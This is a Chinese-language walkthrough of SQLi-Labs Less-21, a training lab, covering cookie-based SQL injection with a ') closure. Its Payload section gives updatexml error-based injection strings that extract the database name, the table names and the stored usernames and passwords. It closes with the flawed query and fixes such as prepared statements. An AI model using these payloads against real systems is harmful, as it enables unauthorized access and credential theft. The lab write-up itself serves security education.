# SQLi-Labs | Less-21 Cookie注入 单引号括号 ') 报错注入
## 一、漏洞简介
本关为Cookie注入，服务端读取Cookie里的uname参数，参数被 `('$cookee')` 包裹，闭合符号为 `')`。登录成功后Cookie才会生效，页面可回显SQL报错信息，采用updatexml报错注入提取数据。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-21/
注入类型：Cookie注入、字符型、')闭合、报错注入
## 三、复现步骤
1. 使用admin/admin登录页面，抓包获取Cookie：uname=admin。
2. 修改Cookie中uname值，填入 `admin')` 测试，页面出现SQL报错，确认闭合方式。
3. 构造updatexml报错注入payload写入uname，发送请求，利用报错带出数据库信息。
4. 依次更换payload，获取库名、表名、字段、账号密码数据。
## 四、Payload
获取数据库名：
Cookie: uname=admin') and updatexml(1,concat(0x7e,database(),0x7e),1) --+
获取所有表：
Cookie: uname=admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
获取账号密码：
Cookie: uname=admin') and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1) --+
## 五、漏洞原理
后端SQL语句：
`SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1`
直接读取Cookie内uname参数拼接进SQL，没有加密、签名校验，也没有使用预编译，用户可控输入可以闭合原有单引号和括号，注入恶意SQL。
## 六、修复方案
1. Cookie身份信息做加密+签名校验，防止篡改。
2. 查询语句使用PDO预编译参数绑定，禁止拼接Cookie内容。
3. 关闭详细MySQL错误回显，过滤Cookie中的特殊符号与SQL关键字。
## 七、总结
Less21和Less20逻辑相近，同样是Cookie注入，区别在于闭合方式变成 `')`，需要注意括号匹配，不能直接套用Less20的单引号payload。